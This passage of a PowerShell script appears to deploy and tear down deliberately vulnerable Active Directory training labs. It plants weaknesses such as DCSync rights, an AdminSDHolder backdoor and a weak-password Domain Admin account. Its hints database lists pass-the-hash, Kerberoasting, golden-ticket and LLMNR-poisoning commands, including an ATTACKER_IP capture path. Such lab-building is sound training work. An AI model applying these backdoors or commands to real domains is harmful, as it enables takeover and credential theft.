    Write-Status "Setting up RBCD abuse path..." WORK
    $compName = $env:COMPUTERNAME
    # analyst01 gets GenericWrite on the computer object (prerequisite for RBCD)
    $sid    = (Get-ADUser "analyst01").SID
    $target = (Get-ADComputer $compName).DistinguishedName
    $acl    = Get-Acl "AD:\$target"
    $rule   = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
        $sid,
        [System.DirectoryServices.ActiveDirectoryRights]::GenericWrite,
        [System.Security.AccessControl.AccessControlType]::Allow
    )
    $acl.AddAccessRule($rule)
    Set-Acl "AD:\$target" $acl -ErrorAction SilentlyContinue
    Add-ActiveLab "D3-RBCD"
    Write-Status "Lab D3 deployed. analyst01 has GenericWrite on $compName computer object." OK
    Write-Status "Exploit: Create attacker machine account -> set msDS-AllowedToActOnBehalfOfOtherIdentity -> getST.py" INFO
}

function Teardown-Lab-D3 {
    $compName = $env:COMPUTERNAME
    $sid    = (Get-ADUser "analyst01").SID
    $target = (Get-ADComputer $compName).DistinguishedName
    $acl    = Get-Acl "AD:\$target"
    $acl.Access | Where-Object { $_.IdentityReference -match "analyst01" } | ForEach-Object { $acl.RemoveAccessRule($_) | Out-Null }
    Set-Acl "AD:\$target" $acl -ErrorAction SilentlyContinue
    # Clean up msDS-AllowedToActOnBehalfOfOtherIdentity if set
    Set-ADComputer -Identity $compName -Clear "msDS-AllowedToActOnBehalfOfOtherIdentity" -ErrorAction SilentlyContinue
    Remove-ActiveLab "D3-RBCD"
    Write-Status "Lab D3 cleaned." OK
}

# ─────────────────────────────────────────────────────────────────────────────
#  ══════════════════  LATERAL MOVEMENT LABS  ══════════════════════════════
# ─────────────────────────────────────────────────────────────────────────────

# L1  -  Pass-the-Hash Setup
function Deploy-Lab-L1 {
    Write-Status "Setting up Pass-the-Hash targets..." WORK
    # Disable RestrictedAdmin mode (required for WCE/Mimikatz PTH)
    Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name "DisableRestrictedAdmin" -Value 0 -ErrorAction SilentlyContinue

    # Create a privileged domain account with a known crackable password.
    # Note: DCs have no local SAM, so "net user /add" silently fails.
    # We create a domain user instead - which is the realistic PTH target anyway
    # (extract NTLM via secretsdump, relay/reuse against other domain systems).
    $localPwd = "football"   # rockyou.txt confirmed
    $localUser = "lab_localadmin"
    $dn = Get-DomainDN
    New-ADUser -Name $localUser -SamAccountName $localUser `
        -UserPrincipalName "$localUser@$($Global:ADPConfig.Domain)" `
        -Path "OU=IT,$dn" `
        -AccountPassword (ConvertTo-SecureString $localPwd -AsPlainText -Force) `
        -Enabled $true -PasswordNeverExpires $true -ErrorAction SilentlyContinue
    # Add to Domain Admins so the NTLM hash is high-value for PTH
    Add-ADGroupMember -Identity "Domain Admins" -Members $localUser -ErrorAction SilentlyContinue
    # Also add itadmin to ensure a known DA hash exists
    Add-ADGroupMember -Identity "Administrators" -Members "itadmin" -ErrorAction SilentlyContinue

    Add-ActiveLab "L1-Pass-The-Hash"
    Write-Status "Lab L1 deployed. PTH target: $localUser / $localPwd (Domain Admin)" OK
    Write-Status "Step 1 - Dump hashes: secretsdump.py [domain]/Administrator:[pwd]@[DC_IP]" INFO
    Write-Status "Step 2 - PTH: psexec.py -hashes :[NTLM] [domain]/$localUser@[target]" INFO
}

function Teardown-Lab-L1 {
    Remove-ADGroupMember -Identity "Domain Admins" -Members "lab_localadmin" -Confirm:$false -ErrorAction SilentlyContinue
    Remove-ADUser -Identity "lab_localadmin" -Confirm:$false -ErrorAction SilentlyContinue
    Remove-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name "DisableRestrictedAdmin" -ErrorAction SilentlyContinue
    Remove-ActiveLab "L1-Pass-The-Hash"
    Write-Status "Lab L1 cleaned." OK
}

# L2  -  Overpass-the-Hash / Pass-the-Key
function Deploy-Lab-L2 {
    Write-Status "Enabling Overpass-the-Hash conditions (RC4/AES key abuse)..." WORK
    # Disable AES enforcement to allow RC4 fallback (Kerberos encryption downgrade)
    Set-ADUser -Identity "svc_sql" -KerberosEncryptionType RC4 -ErrorAction SilentlyContinue
    Set-ADUser -Identity "svc_web" -KerberosEncryptionType RC4 -ErrorAction SilentlyContinue
    # Note: DES/RC4 must be allowed in domain Kerberos policy
    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\Kerberos\Parameters" -Name "AllowTGTSessionKey" -Value 1 -ErrorAction SilentlyContinue
    Add-ActiveLab "L2-Overpass-The-Hash"
    Write-Status "Lab L2 deployed. RC4 allowed for svc_sql, svc_web. TGT session key exported." OK
    Write-Status "Exploit: sekurlsa::pth /user:svc_sql /domain:[d] /ntlm:[hash] in Mimikatz" INFO
}

function Teardown-Lab-L2 {
    Set-ADUser -Identity "svc_sql" -KerberosEncryptionType AES256,AES128,RC4 -ErrorAction SilentlyContinue
    Set-ADUser -Identity "svc_web" -KerberosEncryptionType AES256,AES128,RC4 -ErrorAction SilentlyContinue
    Remove-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\Kerberos\Parameters" -Name "AllowTGTSessionKey" -ErrorAction SilentlyContinue
    Remove-ActiveLab "L2-Overpass-The-Hash"
    Write-Status "Lab L2 cleaned." OK
}

# L3  -  Pass-the-Ticket
function Deploy-Lab-L3 {
    Write-Status "Setting up Pass-the-Ticket targets..." WORK
    # Ensure svc_sql has active sessions and delegation configured
    # The exploit requires Rubeus/Mimikatz to export tickets from memory
    # We set conditions: svc_sql has constrained delegation (already in D2)
    # and a long ticket lifetime
    $dn = Get-DomainDN
    # Set MaxTicketAge in Default Domain Policy (longer lifespan for lab stability)
    $gpoChanged = $false
    $gpo = Get-GPO -Name "Default Domain Policy" -ErrorAction SilentlyContinue
    if ($gpo) {
        Set-GPRegistryValue -Name "Default Domain Policy" `
            -Key "HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Kerberos\Parameters" `
            -ValueName "MaxTicketAge" -Type DWord -Value 24 -ErrorAction SilentlyContinue
        $gpoChanged = $true
    }
    Add-ActiveLab "L3-Pass-The-Ticket"
    Write-Status "Lab L3 deployed. Target: svc_sql TGS for Pass-the-Ticket practice." OK
    if ($gpoChanged) {
        Write-Status "Ticket lifetime extended to 24h via Default Domain Policy." OK
    } else {
        Write-Status "GroupPolicy module unavailable - ticket lifetime NOT extended (lab still functional for single-session)." WARN
    }
    Write-Status "Exploit: Rubeus dump /service:krbtgt then ptt /ticket:[b64]" INFO
}

function Teardown-Lab-L3 {
    # Revert the MaxTicketAge GPO change made by Deploy-Lab-L3
    $gpo = Get-GPO -Name "Default Domain Policy" -ErrorAction SilentlyContinue
    if ($gpo) {
        Remove-GPRegistryValue -Name "Default Domain Policy" `
            -Key "HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Kerberos\Parameters" `
            -ValueName "MaxTicketAge" -ErrorAction SilentlyContinue
    }
    Remove-ActiveLab "L3-Pass-The-Ticket"
    Write-Status "Lab L3 cleaned. Default Domain Policy MaxTicketAge restored." OK
}

# ─────────────────────────────────────────────────────────────────────────────
#  ════════════════════  PERSISTENCE LABS  ═════════════════════════════════
# ─────────────────────────────────────────────────────────────────────────────

# P1  -  AdminSDHolder Backdoor
function Deploy-Lab-P1 {
    Write-Status "Adding analyst01 ACE to AdminSDHolder container..." WORK
    $dn        = Get-DomainDN
    $sdHolder  = "CN=AdminSDHolder,CN=System,$dn"
    $sid       = (Get-ADUser "analyst01").SID
    $acl       = Get-Acl "AD:\$sdHolder"
    $rule      = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
        $sid,
        [System.DirectoryServices.ActiveDirectoryRights]::GenericAll,
        [System.Security.AccessControl.AccessControlType]::Allow
    )
    $acl.AddAccessRule($rule)
    Set-Acl "AD:\$sdHolder" $acl -ErrorAction SilentlyContinue
    Add-ActiveLab "P1-AdminSDHolder"
    Write-Status "Lab P1 deployed. analyst01 has GenericAll on AdminSDHolder." OK
    Write-Status "After SDProp runs (up to 60 min or trigger manually), analyst01 gains GenericAll on all protected objects." INFO
    Write-Status "Force SDProp: Invoke-ADSDPropagation (from PowerView)" INFO
}

function Teardown-Lab-P1 {
    $dn       = Get-DomainDN
    $sdHolder = "CN=AdminSDHolder,CN=System,$dn"
    $acl      = Get-Acl "AD:\$sdHolder"
    $acl.Access | Where-Object { $_.IdentityReference -match "analyst01" } | ForEach-Object { $acl.RemoveAccessRule($_) | Out-Null }
    Set-Acl "AD:\$sdHolder" $acl -ErrorAction SilentlyContinue
    Remove-ActiveLab "P1-AdminSDHolder"
    Write-Status "Lab P1 cleaned." OK
}

# P2  -  DCSync Rights
function Deploy-Lab-P2 {
    Write-Status "Granting analyst01 DCSync replication rights on domain..." WORK
    $dn  = Get-DomainDN
    $sid = (Get-ADUser "analyst01").SID
    $acl = Get-Acl "AD:\$dn"
    # Replicating Directory Changes
    $rdc1 = [System.Guid]"1131f6aa-9c07-11d1-f79f-00c04fc2dcd2"
    # Replicating Directory Changes All
    $rdc2 = [System.Guid]"1131f6ad-9c07-11d1-f79f-00c04fc2dcd2"
    foreach ($guid in @($rdc1,$rdc2)) {
        $rule = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
            $sid,
            [System.DirectoryServices.ActiveDirectoryRights]::ExtendedRight,
            [System.Security.AccessControl.AccessControlType]::Allow,
            $guid,
            [System.DirectoryServices.ActiveDirectorySecurityInheritance]::None
        )
        $acl.AddAccessRule($rule)
    }
    Set-Acl "AD:\$dn" $acl -ErrorAction SilentlyContinue
    Add-ActiveLab "P2-DCSync"
    Write-Status "Lab P2 deployed. analyst01 has DCSync rights." OK
    Write-Status "Exploit: secretsdump.py [domain]/analyst01:[pwd]@[dc_ip]" INFO
}

function Teardown-Lab-P2 {
    $dn  = Get-DomainDN
    $acl = Get-Acl "AD:\$dn"
    $acl.Access | Where-Object { $_.IdentityReference -match "analyst01" } | ForEach-Object { $acl.RemoveAccessRule($_) | Out-Null }
    Set-Acl "AD:\$dn" $acl -ErrorAction SilentlyContinue
    Remove-ActiveLab "P2-DCSync"
    Write-Status "Lab P2 cleaned." OK
}

# P3  -  Shadow Credentials
function Deploy-Lab-P3 {
    Write-Status "Granting helpdesk01 write access to msDS-KeyCredentialLink on dbadmin..." WORK
    $sid    = (Get-ADUser "helpdesk01").SID
    $target = (Get-ADUser "dbadmin").DistinguishedName
    $acl    = Get-Acl "AD:\$target"
    # WriteProperty on msDS-KeyCredentialLink
    $keyGuid = [System.Guid]"5b47d60f-6090-40b7-8e99-10a1d47c0bef"
    $rule    = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
        $sid,
        [System.DirectoryServices.ActiveDirectoryRights]::WriteProperty,
        [System.Security.AccessControl.AccessControlType]::Allow,
        $keyGuid,
        [System.DirectoryServices.ActiveDirectorySecurityInheritance]::None
    )
    $acl.AddAccessRule($rule)
    Set-Acl "AD:\$target" $acl -ErrorAction SilentlyContinue
    Add-ActiveLab "P3-Shadow-Credentials"
    Write-Status "Lab P3 deployed. helpdesk01 can write msDS-KeyCredentialLink on dbadmin." OK
    Write-Status "Exploit: Whisker.exe add /target:dbadmin  then Rubeus asktgt with certificate" INFO
}

function Teardown-Lab-P3 {
    $target = (Get-ADUser "dbadmin").DistinguishedName
    $acl    = Get-Acl "AD:\$target"
    $acl.Access | Where-Object { $_.IdentityReference -match "helpdesk01" } | ForEach-Object { $acl.RemoveAccessRule($_) | Out-Null }
    Set-Acl "AD:\$target" $acl -ErrorAction SilentlyContinue
    # Clear any planted key credentials
    Set-ADUser -Identity "dbadmin" -Clear "msDS-KeyCredentialLink" -ErrorAction SilentlyContinue
    Remove-ActiveLab "P3-Shadow-Credentials"
    Write-Status "Lab P3 cleaned." OK
}

# P4  -  Golden Ticket Prerequisites
function Deploy-Lab-P4 {
    Write-Status "Setting up Golden Ticket lab conditions..." WORK
    # Lower krbtgt password age (so it won't rotate during lab)
    # Grant analyst01 DCSync to retrieve krbtgt hash (depends on P2)
    Deploy-Lab-P2
    # Extend ticket lifetime in policy
    Write-Host ""
    Write-Status "Golden Ticket requires krbtgt NTLM hash  -  obtain via DCSync after completing P2." WARN
    Write-Status "Then: ticketer.py -nthash [krbtgt_hash] -domain-sid [SID] -domain [DOMAIN] Administrator" INFO
    Add-ActiveLab "P4-Golden-Ticket"
    Write-Status "Lab P4 deployed. P2 (DCSync) also deployed as prerequisite." OK
}

function Teardown-Lab-P4 {
    Teardown-Lab-P2
    Remove-ActiveLab "P4-Golden-Ticket"
    Write-Status "Lab P4 cleaned." OK
}

# ─────────────────────────────────────────────────────────────────────────────
#  ════════════════════  SCENARIO ENGINE  ══════════════════════════════════
# ─────────────────────────────────────────────────────────────────────────────

$Global:Scenarios = @{
    1 = @{
        Name        = "Easy  -  New Hire Foothold"
        Description = "Classic entry-level chain: enumerate the domain, find accounts with no pre-auth, crack offline, then spray weak passwords."
        Chain       = @("E9","C1","C3","C5","E3")
        Teardown    = @("E9","C1","C3","C5","E3")
    }
    2 = @{
        Name        = "Medium  -  Internal Pivot"
        Description = "Network poisoning chain: capture NTLMv2 via LLMNR, relay or crack it, enumerate ACLs, abuse WriteDACL to grant DCSync."
        Chain       = @("E2","C4","C6","E4","A1")
        Teardown    = @("E2","C4","C6","E4","A1")
    }
    3 = @{
        Name        = "Hard  -  Full Domain Takeover"
        Description = "Delegation to DA: exploit RBCD as low-priv user, obtain TGS, pivot to shadow credentials, then DCSync."
        Chain       = @("E3","D3","D2","P3","P2")
        Teardown    = @("E3","D3","D2","P3","P2")
    }
    4 = @{
        Name        = "APT Simulation  -  Stealthy Operator"
        Description = "Recon with BloodHound, abuse GenericAll ACE, pivot through constrained delegation, plant AdminSDHolder backdoor."
        Chain       = @("E4","A2","D2","P1")
        Teardown    = @("E4","A2","D2","P1")
    }
    5 = @{
        Name        = "Misconfig Hunt  -  The Auditor"
        Description = "Credential hunting across GPP, attributes, and ACL misconfigurations escalating to domain admin."
        Chain       = @("E8","C5","A3","A5","P2")
        Teardown    = @("E8","C5","A3","A5","P2")
    }
    6 = @{
        Name        = "Trust Attack  -  Cross Domain"
        Description = "Enumerate trusts, abuse SID history artefacts, escalate via writeable computer objects."
        Chain       = @("E10","E1","D3","A2","P2")
        Teardown    = @("E10","E1","D3","A2","P2")
    }
    7 = @{
        Name        = "Quick CTF  -  Speed Run (Random)"
        Description = "3 random labs deployed. Race the clock!"
        Chain       = @()   # dynamically populated
        Teardown    = @()
    }
}

$Global:LabDeployMap = @{
    "E1"  = { Deploy-Lab-E1  }; "E2"  = { Deploy-Lab-E2  }; "E3"  = { Deploy-Lab-E3  }
    "E4"  = { Deploy-Lab-E4  }; "E5"  = { Deploy-Lab-E5  }; "E6"  = { Deploy-Lab-E6  }
    "E7"  = { Deploy-Lab-E7  }; "E8"  = { Deploy-Lab-E8  }; "E9"  = { Deploy-Lab-E9  }
    "E10" = { Deploy-Lab-E10 }; "C1"  = { Deploy-Lab-C1  }; "C2"  = { Deploy-Lab-C2  }
    "C3"  = { Deploy-Lab-C3  }; "C4"  = { Deploy-Lab-C4  }; "C5"  = { Deploy-Lab-C5  }
    "C6"  = { Deploy-Lab-C6  }; "A1"  = { Deploy-Lab-A1  }; "A2"  = { Deploy-Lab-A2  }
    "A3"  = { Deploy-Lab-A3  }; "A4"  = { Deploy-Lab-A4  }; "A5"  = { Deploy-Lab-A5  }
    "D1"  = { Deploy-Lab-D1  }; "D2"  = { Deploy-Lab-D2  }; "D3"  = { Deploy-Lab-D3  }
    "L1"  = { Deploy-Lab-L1  }; "L2"  = { Deploy-Lab-L2  }; "L3"  = { Deploy-Lab-L3  }
    "P1"  = { Deploy-Lab-P1  }; "P2"  = { Deploy-Lab-P2  }; "P3"  = { Deploy-Lab-P3  }
    "P4"  = { Deploy-Lab-P4  }
}

$Global:LabTeardownMap = @{
    "E1"  = { Teardown-Lab-E1  }; "E2"  = { Teardown-Lab-E2  }; "E3"  = { Teardown-Lab-E3  }
    "E4"  = { Teardown-Lab-E4  }; "E5"  = { Teardown-Lab-E5  }; "E6"  = { Teardown-Lab-E6  }
    "E7"  = { Teardown-Lab-E7  }; "E8"  = { Teardown-Lab-E8  }; "E9"  = { Teardown-Lab-E9  }
    "E10" = { Teardown-Lab-E10 }; "C1"  = { Teardown-Lab-C1  }; "C2"  = { Teardown-Lab-C2  }
    "C3"  = { Teardown-Lab-C3  }; "C4"  = { Teardown-Lab-C4  }; "C5"  = { Teardown-Lab-C5  }
    "C6"  = { Teardown-Lab-C6  }; "A1"  = { Teardown-Lab-A1  }; "A2"  = { Teardown-Lab-A2  }
    "A3"  = { Teardown-Lab-A3  }; "A4"  = { Teardown-Lab-A4  }; "A5"  = { Teardown-Lab-A5  }
    "D1"  = { Teardown-Lab-D1  }; "D2"  = { Teardown-Lab-D2  }; "D3"  = { Teardown-Lab-D3  }
    "L1"  = { Teardown-Lab-L1  }; "L2"  = { Teardown-Lab-L2  }; "L3"  = { Teardown-Lab-L3  }
    "P1"  = { Teardown-Lab-P1  }; "P2"  = { Teardown-Lab-P2  }; "P3"  = { Teardown-Lab-P3  }
    "P4"  = { Teardown-Lab-P4  }
}

function Invoke-Scenario {
    param([int]$Id)
    if (-not (Assert-Baseline)) { return }
    $s = $Global:Scenarios[$Id]

    # Speed run  -  random 3 labs
    if ($Id -eq 7) {
        $all   = @($Global:LabDeployMap.Keys | Get-Random -Count 3)
        $s.Chain    = $all
        $s.Teardown = $all
        # Persist so Teardown-Scenario 7 works even after the script is restarted
        $Global:ADPState.ScenarioChain7 = $all
        Save-State
    }

    Write-Banner
    Write-SectionHeader "Deploying: $($s.Name)"
    Write-Color "  $($s.Description)" DarkGray
    Write-Host ""

    foreach ($labId in $s.Chain) {
        Write-Color "  ─── Deploying Lab $labId ──────────────────────" DarkCyan
        & $Global:LabDeployMap[$labId]
        Start-Sleep -Milliseconds 400
    }

    Write-Host ""
    Write-Color "  ╔══════════════════════════════════════════════╗" Green
    Write-Color "  ║  Scenario deployed! Good luck, operator.     ║" Green
    Write-Color "  ╚══════════════════════════════════════════════╝" Green
    Pause-Menu
}

function Teardown-Scenario {
    param([int]$Id)
    $s = $Global:Scenarios[$Id]

    # Speed Run: restore chain from persisted state if in-memory copy is empty (script was restarted)
    if ($Id -eq 7 -and $s.Teardown.Count -eq 0) {
        if ($Global:ADPState.ScenarioChain7.Count -gt 0) {
            $s.Teardown = $Global:ADPState.ScenarioChain7
            Write-Status "Restored Speed Run chain from saved state: $($s.Teardown -join ', ')" INFO
        } else {
            Write-Status "No Speed Run chain found in saved state. Use Teardown All to clean manually." WARN
            Pause-Menu; return
        }
    }

    Write-Banner
    Write-SectionHeader "Tearing Down: $($s.Name)"
    foreach ($labId in $s.Teardown) {
        if ($Global:LabTeardownMap.ContainsKey($labId)) {
            Write-Color "  ─── Cleaning Lab $labId ───────────────────────" DarkCyan
            & $Global:LabTeardownMap[$labId]
        }
    }
    Write-Status "Scenario teardown complete." OK
    Pause-Menu
}

# ─────────────────────────────────────────────────────────────────────────────
#  HINTS DATABASE
# ─────────────────────────────────────────────────────────────────────────────
$Global:LabHints = @{
    "E1"  = @("Use ldapsearch or ldapdomaindump against port 389","Filter for Description attributes: Get-ADUser -Filter * -Properties Description | Where {`$_.Description}","jdoe_legacy has credentials stored in plaintext in the Description field")
    "E2"  = @("Try: smbclient -L //[DC_IP]/ -N","Look for readable shares with smbmap -H [IP] -u '' -p ''","The IT_Share contains files with juicy filenames  -  what do they say?")
    "E3"  = @("Find SPNs: GetUserSPNs.py [domain]/[user]:[pwd] -dc-ip [IP]","PowerView: Get-DomainUser -SPN","Service accounts with SPNs and weak passwords are Kerberoastable")
    "E4"  = @("Run SharpHound: SharpHound.exe -c All","Import the zip into BloodHound","Look for shortest paths to Domain Admins  -  what's the first hop?")
    "E5"  = @("PowerView: Get-DomainUser -UACFilter DONT_REQ_PREAUTH","Check: Get-ADUser -Filter * -Properties adminCount | Where {`$_.adminCount -eq 1}","Users with passwords in Description: Get-ADUser -Filter * -Properties Description")
    "E6"  = @("Test zone transfer: dig axfr [domain] @[DC_IP]","Or: nmap --script dns-zone-transfer -p 53 [DC_IP]","What hostnames are revealed that DNS normally hides?")
    "E7"  = @("Test: rpcclient -U '' -N [DC_IP]","Try enumdomusers, enumdomgroups inside rpcclient","What info can you gather as an anonymous user?")
    "E8"  = @("SYSVOL is readable by all domain users: ls \\[DC]\SYSVOL","Look for Groups.xml or Services.xml files","Decrypt cpassword with gpp-decrypt or Get-GPPPassword")
    "E9"  = @("Run an nmap service scan: nmap -sV -p 80,443,8080,8443 [DC_IP]  -- it is uncommon for a DC to run a web server. What do you find?","Browse the exposed IIS directory listing (anonymous access, no login required): curl http://[DC_IP]/staff/  then download the user list:  curl http://[DC_IP]/staff/users.txt -o users.txt","Feed the list into AS-REP roasting: GetNPUsers.py [domain]/ -dc-ip [DC_IP] -no-pass -usersfile users.txt -format hashcat  then  hashcat -m 18200 hashes.txt rockyou.txt")
    "E10" = @("Enumerate trusts: Get-ADTrust -Filter * or nltest /domain_trusts","PowerView: Get-DomainTrust","What direction is the trust? How can SID history abuse cross it?")
    "C1"  = @("Find targets: GetNPUsers.py [domain]/ -request -no-pass -usersfile users.txt","The hash format is Kerberos 5 AS-REQ Pre-Auth etype 23 (hashcat mode 18200)","Wordlist: rockyou.txt  -  these passwords are intentionally weak")
    "C2"  = @("Request TGS: GetUserSPNs.py [domain]/[user]:[pwd] -request -dc-ip [IP]","Crack with hashcat -m 13100 (Kerberos 5 TGS-REP etype 23)","Which service accounts have weak passwords? Try common service passwords")
    "C3"  = @("Common enterprise passwords to spray: Welcome1, Password1, abc123, letmein","Spray slowly  -  1 attempt per user every 30 min to avoid lockout","kerbrute passwordspray or Spray-Passwords.ps1")
    "C4"  = @("Start Responder: sudo responder -I eth0 -wdF","Wait for any network activity or browse to a non-existent UNC path: \\NONEXISTENT\share","Captured NTLMv2 hashes can be cracked or relayed")
    "C5"  = @("Get-ADUser -Filter * -Properties Description,Info | Select SAMAccountName,Description,Info","Look for patterns like 'pwd:', 'pass:', 'password:' in the output","Which accounts have credentials stored? Can you reuse them?")
    "C6"  = @("The LabTrigger share has a desktop.ini pointing to an attacker UNC path","Update the ATTACKER_IP in the file, then have a domain user browse the share","Capture with Responder, then crack or relay the NTLMv2 hash")
    "A1"  = @("Check: (Get-ACL 'AD:\\[DomainDN]').Access | Where IdentityReference -match 'helpdesk01'","WriteDACL lets you modify the DACL  -  add DCSync rights to yourself","PowerView: Add-DomainObjectAcl -TargetIdentity [domain] -Rights DCSync")
    "A2"  = @("GenericAll = full control over the object","Options: reset password, add SPN for Kerberoasting, add to group","Set-ADAccountPassword -Identity dbadmin -Reset -NewPassword (as helpdesk01)")
    "A3"  = @("GenericWrite lets you modify non-protected attributes","Set a SPN: Set-ADUser -Identity svc_sql -ServicePrincipalNames @{Add='fake/spn'}","Then Kerberoast the newly-set SPN")
    "A4"  = @("ForceChangePassword = User-Force-Change-Password extended right","PowerView: Set-DomainUserPassword -Identity analyst01 -AccountPassword [newpwd]","Or net rpc password analyst01 [newpwd] -U helpdesk01%[pwd] -S [DC]")
    "A5"  = @("WriteProperty on member = you can add yourself or others to the group","Add-ADGroupMember -Identity IT-Admins -Members analyst01 (run as analyst01)","What privileges does IT-Admins have? Check with PowerView Get-DomainGroupMember")
    "D1"  = @("Find unconstrained delegation: Get-ADComputer -Filter {TrustedForDelegation -eq `$true}","The DC and all DCs have unconstrained delegation by default  -  focus on non-DC machines","Abuse: trigger a DC to authenticate to the unconstrained machine, steal TGT with Rubeus")
    "D2"  = @("Find: Get-ADUser -Filter {TrustedToAuthForDelegation -eq `$true}","Constrained with protocol transition (S4U2Self) = you can impersonate any user","getST.py -spn cifs/[target] -impersonate Administrator -dc-ip [DC] [dom]/svc_sql:[pwd]")
    "D3"  = @("RBCD prerequisite: write access to msDS-AllowedToActOnBehalfOfOtherIdentity on the target computer","Step 1: Create a machine account (MachineAccountQuota allows this)","Step 2: Set the attribute. Step 3: Request S4U2Self+S4U2Proxy TGS as that machine")
    "L1"  = @("First dump hashes: secretsdump.py [domain]/Administrator:[pwd]@[DC]","Use the NTLM hash with: psexec.py -hashes :[NTLM] [domain]/Administrator@[target]","Or: wmiexec.py, smbexec.py  -  all accept -hashes flag")
    "L2"  = @("Dump NTLM hash from memory: sekurlsa::logonpasswords in Mimikatz","Then: sekurlsa::pth /user:[user] /domain:[dom] /ntlm:[hash] /run:powershell.exe","This spawns a process with that user's identity  -  run klist to confirm")
    "L3"  = @("Export tickets: Rubeus dump /service:krbtgt or Mimikatz sekurlsa::tickets /export","Pass ticket: Rubeus ptt /ticket:[base64] then klist to confirm","Or use WinRM/PSSession after importing the TGS for the service")
    "P1"  = @("AdminSDHolder propagates ACEs to all protected groups every 60 min (SDProp)","Force it: Invoke-ADSDPropagation (from PowerView/PowerSploit)","After propagation, analyst01 will have GenericAll on Domain Admins, Enterprise Admins, etc.")
    "P2"  = @("DCSync mimics a replication partner to pull password hashes","secretsdump.py [domain]/analyst01:[pwd]@[DC_IP] -just-dc-ntlm","You get krbtgt hash  -  what can you do with it?")
    "P3"  = @("Whisker: Whisker.exe add /target:dbadmin /domain:[DOM] /dc:[DC]","This creates a certificate and sets msDS-KeyCredentialLink","Then: Rubeus asktgt /user:dbadmin /certificate:[cert] /password:[certpwd]")
    "P4"  = @("Step 1: DCSync to get krbtgt NTLM hash (P2 is deployed as prereq)","Golden Ticket: ticketer.py -nthash [krbtgt_hash] -domain-sid [SID] -domain [DOM] Administrator","The ticket works even if the real Administrator password changes  -  that's the power")
}

# ─────────────────────────────────────────────────────────────────────────────
#  ════════════════════════  MENU SYSTEM  ══════════════════════════════════
# ─────────────────────────────────────────────────────────────────────────────

function Show-LabSubMenu {
    param(
        [string]$Category,
        [hashtable[]]$Labs
    )
    while ($true) {
        Write-Banner
        Write-SectionHeader "Labs   -   $Category"

        $i = 1
        foreach ($lab in $Labs) {
            $active = if ($Global:ADPState.ActiveLabs -contains $lab.Id) { "[ACTIVE]" } else { "" }
            $col    = if ($active) { "Green" } else { "White" }
            Write-Color "    [" DarkGray -NoNewline
            Write-Color "$i" Yellow -NoNewline
            Write-Color "] " DarkGray -NoNewline
            Write-Color "$($lab.Id)  -  $($lab.Name)" $col -NoNewline
            if ($active) { Write-Color "  $active" Green }
            else { Write-Host "" }
            $i++
        }
        Write-Host ""
        Write-MenuItem "B" "Back" Magenta

        $choice = Get-MenuChoice "Select a lab"
        if ($choice -eq "B" -or $choice -eq "b") { return }

        $idx = [int]$choice - 1
        if ($idx -ge 0 -and $idx -lt $Labs.Count) {
            $lab = $Labs[$idx]
            Show-LabActionMenu -Lab $lab
        }
    }
}

function Show-LabActionMenu {
    param([hashtable]$Lab)
    while ($true) {
        Write-Banner
        Write-SectionHeader "$($Lab.Id)  -  $($Lab.Name)"
        Write-Color "  $($Lab.Desc)" DarkGray
        Write-Host ""
        $isActive = $Global:ADPState.ActiveLabs -contains $Lab.Id

        if ($isActive) {
            Write-Color "  Status: " DarkGray -NoNewline; Write-Color "ACTIVE" Green
        } else {
            Write-Color "  Status: " DarkGray -NoNewline; Write-Color "Inactive" DarkGray
        }
        Write-Host ""
        Write-MenuItem "1" "Deploy Lab"     Green
        Write-MenuItem "2" "Teardown Lab"   Red
        Write-MenuItem "3" "Show Hints"     Yellow
        Write-MenuItem "B" "Back"           Magenta
        Write-Host ""

        $choice = Get-MenuChoice "Action"
        switch ($choice) {
            "1" {
                if (-not (Assert-Baseline)) { continue }
                Write-Host ""
                & $Global:LabDeployMap[$Lab.Id]
                Pause-Menu
            }
            "2" {
                Write-Host ""
                & $Global:LabTeardownMap[$Lab.Id]
                Pause-Menu
            }
            "3" {
                $hints = $Global:LabHints[$Lab.Id]
                if ($hints) { Show-LabHints -LabName "$($Lab.Id)  -  $($Lab.Name)" -Hints $hints }
                else { Write-Status "No hints available for this lab." WARN; Pause-Menu }
            }
            { $_ -in "B","b" } { return }
        }
    }
}

$Global:LabCatalog = @{
    Enumeration = @(
        @{Id="E1";  Name="LDAP Null/Authenticated Enumeration"; Desc="Enables anonymous LDAP reads and plants credentials in user attributes."}
        @{Id="E2";  Name="SMB Null Sessions & Share Enumeration"; Desc="Opens SMB null sessions and creates a share with juicy files."}
        @{Id="E3";  Name="SPN Enumeration"; Desc="Configures multiple service accounts with SPNs for Kerberoast discovery."}
        @{Id="E4";  Name="BloodHound / SharpHound Data Collection"; Desc="Creates complex ACL relationships for BloodHound attack path analysis."}
        @{Id="E5";  Name="PowerView Target Setup"; Desc="Sets adminCount artifacts, AS-REP candidates, and cleartext creds."}
        @{Id="E6";  Name="DNS Zone Transfer"; Desc="Enables zone transfers from any host for internal DNS enumeration."}
        @{Id="E7";  Name="RPC Enumeration"; Desc="Enables RPC null sessions for anonymous user/group enumeration."}
        @{Id="E8";  Name="GPO / GPP Password Enumeration"; Desc="Plants cpassword entries in SYSVOL for GPP credential discovery."}
        @{Id="E9";  Name="User Enumeration (IIS exposed directory)"; Desc="Installs IIS, enables anonymous directory browsing on /staff/ with users.txt, emails.txt and staff_directory.txt. Simulates a DC running an internal web server with no access control."}
        @{Id="E10"; Name="Trust Enumeration"; Desc="Simulates domain trust artifacts for enumeration practice."}
    )
    Credential = @(
        @{Id="C1"; Name="AS-REP Roasting"; Desc="Disables Kerberos pre-auth on multiple accounts."}
        @{Id="C2"; Name="Kerberoasting"; Desc="Assigns SPNs to service accounts with crackable passwords."}
        @{Id="C3"; Name="Password Spraying"; Desc="Sets predictable weak passwords on a set of accounts."}
        @{Id="C4"; Name="LLMNR / NBT-NS Poisoning"; Desc="Enables LLMNR and NBT-NS, disables SMB signing."}
